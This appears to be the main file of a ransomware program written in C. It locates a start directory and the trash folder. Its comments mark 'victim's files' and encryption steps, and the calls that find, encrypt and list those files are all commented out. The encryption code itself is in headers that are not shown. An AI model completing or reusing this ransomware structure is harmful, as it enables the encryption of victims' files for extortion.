#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include"lib/func.h"
#include"lib/crypto.h"
#include"lib/struct.h"



int main(){
    List *files = NULL;
    List *encrypted = NULL;
    List *not_encrypted = NULL;
    char* start_path = get_start_path();
    char *trash = get_trash_path(start_path);

    //char *start_path = "/home/tarcisio/Desktop/testes/";

    printf("%s %s\n",start_path, trash );
    // finding all victim's files
    //find_files(&files, start_path);
    //find_files(&files, trash);

    // start encryption
    //encrypt_files(files, &encrypted, &not_encrypted);
    //print(encrypted);
    //save_into_file_encrypted_list(encrypted, start_path);
    //destroy(&encrypted);
    //read_from_file_encrypted_files(&encrypted, start_path);
    //print(encrypted);
    //destroy(&files);
    //destroy_encrypted_list(&encrypted);

    return 0;
}
